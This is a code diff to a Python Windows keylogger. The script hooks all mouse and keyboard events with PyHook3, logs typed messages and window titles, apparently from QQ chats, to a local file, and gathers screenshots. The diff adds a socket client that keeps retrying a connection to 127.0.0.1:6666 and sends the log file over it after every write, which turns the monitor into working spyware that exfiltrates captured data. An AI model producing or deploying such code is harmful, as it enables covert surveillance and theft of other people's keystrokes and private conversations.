@@ -10,6 +10,15 @@ MSG=""
 save_to=1
 title_word=""
 global_title=""
+ADDR=('127.0.0.1', 6666)
+runstatus=1
+PSIZE=1024
+set_encoding='utf-8'
+clientSockfd=""
+open_filename='D:/QQdata/data/Monitor.txt'
+dos_filename='D:\\QQdata\\data\\Monitor.txt'
+dos_pic_dir='D:\\QQdata\\data\\xx11\\'
+
 
 def server_connect():
     tcpSock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,19 +31,21 @@ def iter_count(file_name):
     return sum(buf.count('\n') for buf in buf_gen)
 
 def write_msg_to_txt(msg):
-    if os.path.exists('D:\\QQdata\\data\\Monitor.txt')==False:
-        os.system('mkdir d:\\QQdata\\data\\xx11 >nul')
-        os.system('type nul > d:\\QQdata\\data\\Monitor.txt')
+    global open_filename
+    global dos_filename
+    global dos_pic_dir
+    if os.path.exists(dos_filename)==False:
+        os.system('mkdir %s >nul' %dos_pic_dir)
+        os.system('type nul > %s' %dos_filename)
         quit()
-    fname='D:/QQdata/data/Monitor.txt'
+    cl=iter_count(open_filename)+1
+    if cl >=200:
+        os.system('type nul > %s' %dos_filename)
 
-    cl=iter_count(fname)+1
-    if cl >=2000:
-        os.system('type nul > d:\\QQdata\\data\\Monitor.txt')
-
-    f=open(fname,'a')
+    f=open(open_filename,'a')
     f.write(msg+'\x0A')
     f.close()
+    sendfile(open_filename)
 
 def get_local_time(press):
     if press=='keyboard':
@@ -45,7 +56,7 @@ def get_local_time(press):
 def get_local_image(dirpath):
     pic_lists =os.listdir(dirpath)
     print(len(pic_lists))
-    if len(pic_lists) >1000:
+    if len(pic_lists) >100:
         for pl in pic_lists:
             fpath=dirpath+pl
             if os.path.isfile(fpath):
@@ -60,13 +71,15 @@ def onMouseEvent(event):
     global lists
     global MSG
     global global_title
+    global dos_pic_dir
+
     mouse_status=event.MessageName
     pic_msg=""
     if mouse_status=="mouse left down" or mouse_status=="mouse right down":
         if global_title in lists:
             if MSG!="":
                 write_msg_to_txt(MSG)
-                pic_msg=get_local_image('d:\\QQdata\\data\\xx11\\')
+                pic_msg=get_local_image(dos_pic_dir)
                 write_msg_to_txt(pic_msg)
             global_title=""
     # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
@@ -133,19 +146,50 @@ def onKeyboardEvent(event):
     #-----------------------------------------------------------------------
     # 同鼠标事件监听函数的返回值
     return True
+def sendfile(filename):
+    global PSIZE
+    global clientSockfd
+    global set_encoding
+
+    f=open(filename,'rb')
+    while True:
+        msg=f.read(PSIZE)
+        if not msg:
+            break
+        clientSockfd.sendall(msg)
+    f.close()
+    clientSockfd.sendall(bytes('EOF', encoding=set_encoding))
+    print('send file success')
 
 def main():
-    # 创建一个“钩子”管理对象
-    hm = PyHook3.HookManager()
-    # 监听所有鼠标事件钩子
-    hm.MouseAll = onMouseEvent
-    hm.HookMouse()
-    # 监听所有键盘事件钩子
-    hm.KeyDown = onKeyboardEvent
-    hm.HookKeyboard()
-    # 进入循环，如不手动关闭，程序将一直处于监听状态
-    pythoncom.PumpMessages()
+    global ADDR
+    global runstatus
+    global clientSockfd
 
+    while True:
+        ltime=time.strftime('%S',time.localtime(time.time()))
+        if int(ltime)%6==0:
+            try:
+                clientSockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                clientSockfd.connect(ADDR)
+                print("已建立连接....",ADDR)
+                runstatus=0
+                break
+            except socket.error:
+                print('无法正常连接:{}，错误信息:'.format(str(ADDR)),socket.error)
+        else:
+            time.sleep(1)
+    if runstatus==0:
+        # 创建一个“钩子”管理对象
+        hm = PyHook3.HookManager()
+        # 监听所有鼠标事件钩子
+        hm.MouseAll = onMouseEvent
+        hm.HookMouse()
+        # 监听所有键盘事件钩子
+        hm.KeyDown = onKeyboardEvent
+        hm.HookKeyboard()
+        # 进入循环，如不手动关闭，程序将一直处于监听状态
+        pythoncom.PumpMessages()
 if __name__ == "__main__":
     main()
 
